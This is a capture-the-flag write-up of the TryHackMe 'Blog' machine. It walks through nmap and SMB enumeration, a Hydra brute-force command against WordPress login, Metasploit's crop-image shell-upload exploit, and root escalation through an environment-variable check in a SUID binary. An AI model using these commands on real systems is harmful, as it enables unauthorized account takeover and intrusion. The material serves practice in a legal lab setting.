# Blog - Write-Up

>[!INFO] Target information: **10.10.213.28**
## Reconnaissance
### Enumeration

We start by enumerating the ports on our target:

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[~/CTF-Write-Ups/THM_Blog]
â””â”€# nmap -sS -sV -sC $ip

```

Samba appears to be running on our target, let's see what enum4linux tells us:

```bash

```

We have a share called "BillySMB" that we can enumerate, further results revealed that there was a Unix user named "bjoel".

After checking the SMB method rabbit hole, we proceed to enumerate the directories.

Let's also check what robots.txt says:

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

From the nmap scan, we knew it was a WordPress site, so let's see if we can access the admin page.

## Brute Forcing

Let's perform a wpscan on the target to get the WordPress users.

```bash
â”€â”€(rootðŸ’€kali)-[~]
â””â”€# wpscan --url http://10.10.48.134/ --enumerate u                                                                 4 â¨¯

It seems that we have a user that we did not encounter before during our enum4linux.

Let's brute force the password for user "kwheel" using Hydra.

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# hydra -l kwheel -P /home/kali/Desktop/rockyou.txt 10.10.48.134 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -I 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-06 03:09:42

```

Now we have the password for "kwheel" and we can use a Metasploit module to obtain a reverse shell.

```bash
msf6 > search crop-image

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_crop_rce

msf6 > use 0
```

Now we just need to provide the options USERNAME, PASSWORD, RHOSTS, and LHOSTS, and execute that stuff!

## Privilege Escalation

Our main goals: `user.txt` & `root.txt`. We can usually find the user flag with a simple find command.

```bash
find / 2>/dev/null | grep user.txt
/home/bjoel/user.txt
```

Only when cat'ing this file:

```bash
You won't find what you're looking for here.

TRY HARDER
```

Okay, we can make an extra effort, let's see about the SUID files:

```bash
find / -perm -u=s -type f 2>/dev/null
```

One file that stands out is `/usr/bin/checker`.

Nothing was found on `GTFOBins`, so let's see what happens when we execute it:

```bash
ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
```

So, it gets an `"admin"` environment variable and then prints `"Not an Admin"`.

What would happen if we declare this variable?

```bash
export admin=1
ltrace checker
getenv("admin")                                  = "1"
setuid(0)                                        = -1
system("/bin/bash"
```

Oh, so it tries to execute bash, with root privileges, which gives us a bash command with root privileges, AWESOME!

```bash
checker
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

Let's execute that command again for the user flag.

```bash
find / 2>/dev/null | grep user.txt
/home/bjoel/user.txt
/media/usb/user.txt
cat /media/usb/user.txt
[REDACTED]
```

Also, don't forget the root flag.

```bash
cat /root/root.txt
[REDACTED]
```
